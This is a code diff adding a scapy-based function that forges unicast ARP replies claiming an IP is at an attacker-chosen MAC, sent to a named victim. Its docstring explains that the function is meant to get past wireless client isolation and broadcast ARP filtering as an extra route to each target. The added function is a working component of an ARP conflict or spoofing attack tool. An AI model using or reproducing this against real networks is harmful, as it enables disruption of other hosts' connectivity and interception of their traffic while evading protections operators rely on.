@@ -174,6 +174,22 @@ def build_garp(ip: str, mac: str, op: int = 1) -> Ether:
     )
 
 
+def build_arp_conflict_unicast(ip: str, mac: str, victim_mac: str) -> Ether:
+    """The same claim `build_garp(op=2)` makes — `ip` is at `mac`, psrc == pdst — but delivered
+    unicast to `victim_mac` instead of broadcast (§5b).
+
+    Redundancy, not a replacement: broadcast is the RFC 5227 form and is what a conforming
+    stack's address-conflict detection listens for. This exists for the delivery paths where
+    the broadcast never arrives — wireless APs with client isolation routinely drop
+    station-to-station *broadcast* while still forwarding unicast to a known station, and some
+    stacks rate-limit or filter broadcast ARP far more aggressively than unicast on the input
+    path. One extra frame per target per round buys a second, independent way in.
+    """
+    return Ether(src=mac, dst=victim_mac) / ARP(
+        op=ARP_REPLY, hwsrc=mac, psrc=ip, hwdst=victim_mac, pdst=ip
+    )
+
+
 def build_arp_request(ip: str, src_ip: str, src_mac: str | None = None) -> Ether:
     eth = Ether(dst="ff:ff:ff:ff:ff:ff")
     if src_mac:
